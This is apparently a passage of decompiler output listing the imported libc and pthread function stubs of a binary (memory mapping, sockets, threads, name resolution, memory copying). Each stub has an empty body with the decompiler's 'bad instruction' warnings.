/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t pread64(int __fd,void *__buf,size_t __nbytes,__off64_t __offset)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040060  mmap64  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * mmap64(void *__addr,size_t __len,int __prot,int __flags,int __fd,__off64_t __offset)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040064  munmap  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int munmap(void *__addr,size_t __len)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040068  calloc  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * calloc(size_t __nmemb,size_t __size)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004006c  mprotect  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int mprotect(void *__addr,size_t __len,int __prot)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040070  __vsnprintf_chk  size=1

/* WARNING: Control flow encountered bad instruction data */

void __vsnprintf_chk(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040074  opendir  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

DIR * opendir(char *__name)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040078  dirfd  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int dirfd(DIR *__dirp)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004007c  closedir  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int closedir(DIR *__dirp)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040080  readdir  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

dirent * readdir(DIR *__dirp)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040084  fcntl  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fcntl(int __fd,int __cmd,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040088  sigaltstack  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int sigaltstack(sigaltstack *__ss,sigaltstack *__oss)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004008c  syscall  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

long syscall(long __sysno,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040090  strtol  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

long strtol(char *__nptr,char **__endptr,int __base)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040094  socketpair  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int socketpair(int __domain,int __type,int __protocol,int *__fds)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040098  strtoul  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ulong strtoul(char *__nptr,char **__endptr,int __base)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004009c  getsockopt  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int getsockopt(int __fd,int __level,int __optname,void *__optval,socklen_t *__optlen)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400a0  getsockname  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int getsockname(int __fd,sockaddr *__addr,socklen_t *__len)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400a4  getpeername  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int getpeername(int __fd,sockaddr *__addr,socklen_t *__len)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400a8  sendto  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t sendto(int __fd,void *__buf,size_t __n,int __flags,sockaddr *__addr,socklen_t __addr_len)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400ac  sendmsg  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t sendmsg(int __fd,msghdr *__message,int __flags)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400b0  recvmsg  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t recvmsg(int __fd,msghdr *__message,int __flags)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400b4  __cmsg_nxthdr  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

cmsghdr * __cmsg_nxthdr(msghdr *__mhdr,cmsghdr *__cmsg)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400b8  dprintf  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int dprintf(int __fd,char *__fmt,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400bc  vdprintf  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int vdprintf(int __fd,char *__fmt,__gnuc_va_list __arg)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400c0  _exit  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void _exit(int __status)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400c4  memalign  size=1

/* WARNING: Control flow encountered bad instruction data */

void memalign(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400c8  fork  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__pid_t fork(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400cc  pthread_gettid_np  size=1

/* WARNING: Control flow encountered bad instruction data */

void pthread_gettid_np(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400d0  gettid  size=1

/* WARNING: Control flow encountered bad instruction data */

void gettid(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400d4  getpid  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__pid_t getpid(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400d8  pthread_getattr_np  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_getattr_np(pthread_t __th,pthread_attr_t *__attr)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400dc  pthread_setname_np  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_setname_np(pthread_t __target_thread,char *__name)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400e0  pthread_setschedparam  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_setschedparam(pthread_t __target_thread,int __policy,sched_param *__param)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400e4  pthread_getschedparam  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_getschedparam(pthread_t __target_thread,int *__policy,sched_param *__param)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400e8  pthread_getcpuclockid  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_getcpuclockid(pthread_t __thread_id,__clockid_t *__clock_id)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400ec  pthread_detach  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_detach(pthread_t __th)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400f0  pthread_join  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_join(pthread_t __th,void **__thread_return)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400f4  pthread_kill  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_kill(pthread_t __threadid,int __signo)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400f8  pthread_exit  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void pthread_exit(void *__retval)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 000400fc  __pthread_cleanup_pop  size=1

/* WARNING: Control flow encountered bad instruction data */

void __pthread_cleanup_pop(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040100  __pthread_cleanup_push  size=1

/* WARNING: Control flow encountered bad instruction data */

void __pthread_cleanup_push(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040104  pthread_create  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_create(pthread_t *__newthread,pthread_attr_t *__attr,__start_routine *__start_routine,
                  void *__arg)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040108  pthread_atfork  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_atfork(__prepare *__prepare,__parent *__parent,__child *__child)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004010c  pthread_setspecific  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_setspecific(pthread_key_t __key,void *__pointer)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040110  pthread_getspecific  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * pthread_getspecific(pthread_key_t __key)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040114  pthread_key_delete  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_key_delete(pthread_key_t __key)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040118  pthread_key_create  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_key_create(pthread_key_t *__key,__destr_function *__destr_function)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004011c  realloc  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * realloc(void *__ptr,size_t __size)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040120  posix_memalign  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int posix_memalign(void **__memptr,size_t __alignment,size_t __size)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040124  malloc_usable_size  size=1

/* WARNING: Control flow encountered bad instruction data */

void malloc_usable_size(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040128  mallinfo  size=1

/* WARNING: Control flow encountered bad instruction data */

void mallinfo(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004012c  dl_iterate_phdr  size=1

/* WARNING: Control flow encountered bad instruction data */

void dl_iterate_phdr(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040130  dladdr  size=1

/* WARNING: Control flow encountered bad instruction data */

void dladdr(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040134  clone  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int clone(__fn *__fn,void *__child_stack,int __flags,void *__arg,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040138  pthread_self  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

pthread_t pthread_self(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004013c  exit  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void exit(int __status)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040140  getaddrinfo  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int getaddrinfo(char *__name,char *__service,addrinfo *__req,addrinfo **__pai)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040144  gethostbyname  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

hostent * gethostbyname(char *__name)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040148  gethostbyname2  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

hostent * gethostbyname2(char *__name,int __af)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004014c  gethostbyaddr  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

hostent * gethostbyaddr(void *__addr,__socklen_t __len,int __type)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040150  getnameinfo  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int getnameinfo(sockaddr *__sa,socklen_t __salen,char *__host,socklen_t __hostlen,char *__serv,
               socklen_t __servlen,uint __flags)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040154  dlerror  size=1

/* WARNING: Control flow encountered bad instruction data */

void dlerror(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040158  memcpy  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memcpy(void *__dest,void *__src,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004015c  memmove  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memmove(void *__dest,void *__src,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040160  memset  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memset(void *__s,int __c,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



